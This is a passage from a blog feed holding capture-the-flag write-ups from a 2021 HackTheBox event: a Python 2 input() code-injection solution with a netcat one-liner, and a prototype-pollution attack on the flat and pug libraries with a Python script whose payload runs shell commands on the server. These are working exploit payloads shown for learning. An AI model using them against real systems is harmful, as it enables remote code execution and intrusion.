d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analysis">Analysis<a href="https://kblagoev.com/blog/input-as-a-service-cyberapocalypse-2021-ctf#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis">​</a></h3>
<p>We see in the traceback, that we're supplying info to an <code>input</code> function inside of python2.x. This method has a well known vulnerability, which is that it tries to run the value of <code>input()</code> as code.</p>
<p>We can easily make use of that, and see if we can't invoke the <code>os</code> module of python, and maybe do some filesystem recon. We can do that by sending the following line into the input</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin">__import__</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"os"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"ls"</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And we will see, that one of the files is indeed <code>flag.txt</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/input-as-a-service-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>We can go as complicated as we like, but the most straightforward way to solve this particular challenge, is to invoke the <code>os</code> module of python, and try to run <code>cat</code> on the file we found <code>flag.txt</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">GCC </span><span class="token number" style="color:#36acaa">9.3</span><span class="token number" style="color:#36acaa">.0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Do you sound like an alien?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token builtin">__import__</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'os'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'cat flag.txt'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">4li3n5_us3_pyth0n2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">X?!</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And so, we get the flag</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{4li3n5_us3_pyth0n2.X?!}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I'll throw the following line here as well, for reference</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo </span><span class="token string" style="color:#e3116c">'int(().__class__.__base__.__subclasses__()[40]("flag.txt","r").read())'</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> nc </span><span class="token number" style="color:#36acaa">188.166</span><span class="token number" style="color:#36acaa">.145</span><span class="token number" style="color:#36acaa">.178</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">31960</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> grep </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">o CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">color</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">none</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[BlitzProp - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/blitzprop-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/blitzprop-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/blitzprop-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>A tribute page for the legendary alien band called BlitzProp!</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/blitzprop-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We're provided with the source code for a cute webpage, which allows us to vote for some song names using an input field.</p>
<p>By looking at the song names we're supposed to vote for, we could potentially notice some hints like <strong>Polluting</strong> and <strong>AST</strong>.</p>
<p>The site seems to be running on a <code>node</code> environment with an <code>express</code> server, so we can check out the routes handling file.</p>
<div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> path              </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'path'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> express           </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'express'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> pug               </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'pug'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> unflatten </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">     </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'flat'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> router            </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> express</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">Router</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">router</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'/'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">req</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token arrow operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword control-flow" style="color:#00009f">return</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">sendFile</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">resolve</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'views/index.html'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">router</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'/api/submit'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">req</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> res</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token arrow operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> song </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">unflatten</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">req</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">body</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">req</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">body</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">unflatten</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">req</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">body</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword control-flow" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">song</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">name</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">includes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Not Polluting with the boys'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> song</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">name</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">includes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'ASTa la vista baby'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> song</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">name</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">includes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'The Galactic Rhymes'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> song</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">name</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">includes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'The Goose went wild'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token keyword control-flow" style="color:#00009f">return</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			</span><span class="token string-property property" style="color:#36acaa">'response'</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> pug</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">compile</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'span Hello #{user}, thank you for letting us know!'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token literal-property property" style="color:#36acaa">user</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">'guest'</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword control-flow" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token keyword control-flow" style="color:#00009f">return</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			</span><span class="token string-property property" style="color:#36acaa">'response'</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'Please provide us with the name of an existing song.'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">module</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">exports</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> router</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Looking closely, we see that the <code>/api/submit</code> POST endpoint uses a module called <code>flat</code> to unflatten a request body into json. The code also uses <code>pug</code> for templating.</p>
<p>We can check the versions of these libraries in the <code>package.json</code> file.</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token property" style="color:#36acaa">"dependencies"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">"express"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"^4.17.1"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">"flat"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"5.0.0"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">"pug"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"^3.0.0"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The version of flat used seems to be vulnerable to prototype pollution, and we can find information on the payloads we can use <a href="https://blog.p6.is/AST-Injection/#Example-1" target="_blank" rel="noopener noreferrer">here</a>, finding an example exploiting <code>pug</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/blitzprop-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>By having the exploit at hand, we can write a simple script which will send a POST request with the required <code>song.name</code> in the data, as well as with our payload.</p>
<p>The payload itself will allow us to do <em>Remote Code Execution</em>. More to the point, we will cat the flag file into the publically available <code>/static/js</code> folder, so we can navigate to it after the pollution exploit.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TARGET_URL </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'http://46.101.44.190:32262'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># make pollution</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">TARGET_URL </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'/api/submit'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> json </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">"song.name"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">"The Goose went wild"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">"__proto__.block"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">"type"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Text"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">"line"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"process.mainModule.require('child_process').execSync('cat flag* &gt; static/js/main.js')"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># execute</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">TARGET_URL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 